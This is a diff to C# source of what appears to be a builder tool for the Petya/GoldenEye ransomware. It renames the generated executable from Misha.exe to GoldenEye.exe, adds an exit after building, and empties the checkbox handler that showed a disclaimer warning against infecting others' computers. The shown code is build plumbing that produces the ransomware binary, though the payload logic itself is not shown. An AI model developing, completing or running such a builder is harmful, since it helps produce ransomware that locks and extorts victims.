@@ -163,22 +163,23 @@ namespace Petya_and_GoldenEye_BUILDER
 		{
             		if (this.checkBox1.Checked) // I pinky swear.
 			{
-                		if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe"))
+                		if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + "\\GoldenEye.exe"))
 				{
-					File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
+					File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + "\\GoldenEye.exe");
 				}
 
 				this.InstallFiles();
 				this.ReplaceMethod();
 
-				File.Move(this.mihabin, Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe");
+				File.Move(this.mihabin, Path.GetDirectoryName(Application.ExecutablePath) + "\\GoldenEye.exe");
                 		this.RemoveFiles();
 				
-                		MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\Misha.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                		MessageBox.Show("Done, path: " + Path.GetDirectoryName(Application.ExecutablePath) + "\\GoldenEye.exe", "Successful.", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+				        Application.Exit();
 			}
 			else
 			{
-				MessageBox.Show("Please accept terms of service", "Aborted!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
+				MessageBox.Show("Please Accept the EULA!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
 			}
 		}
 
@@ -350,21 +351,7 @@ namespace Petya_and_GoldenEye_BUILDER
 
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
         {
-			if (checkBox1.Checked)
-            {
-				this.checkBox1.Checked = false;
-            }
-			else
-            {
-				if (MessageBox.Show("This program has been made just for fun.\nYou don't have to build the ransomware to infect other's PCs.\nThe author of this tool is not responsible for any damages or wrong uses. Continue?", "EULA", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2) == DialogResult.No)
-				{
-					this.checkBox1.Checked = false;
-				}
-				else
-                {
-					this.checkBox1.Checked = true;
-                }
-			}
+			
         }
     }
 }
